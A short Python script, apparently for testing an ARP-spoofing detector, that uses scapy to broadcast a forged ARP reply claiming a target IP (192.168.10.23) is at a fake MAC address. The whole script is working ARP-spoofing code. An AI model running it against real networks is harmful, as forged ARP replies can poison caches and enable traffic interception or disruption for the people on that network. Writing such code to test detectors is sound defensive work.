from scapy.all import Ether, ARP, sendp, conf

def send_spoof_packet(target_ip, fake_mac, count=1, iface=None):
    """
    Send rogue ARP reply claiming target_ip is at fake_mac.
    """
    fake_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        psrc=target_ip,
        hwsrc=fake_mac
    )
    sendp(fake_packet, count=count, iface=iface or conf.iface, verbose=False)
    return True

if __name__ == "__main__":
    # Target an IP already learned by your detector
    target_ip = "192.168.10.23"
    fake_mac = "aa:bb:cc:11:22:33"

    print(f"[*] Sending rogue ARP reply claiming {target_ip} is at {fake_mac}...")
    send_spoof_packet(target_ip, fake_mac, count=1)
    print("[+] Injected 1 spoofed frame.")
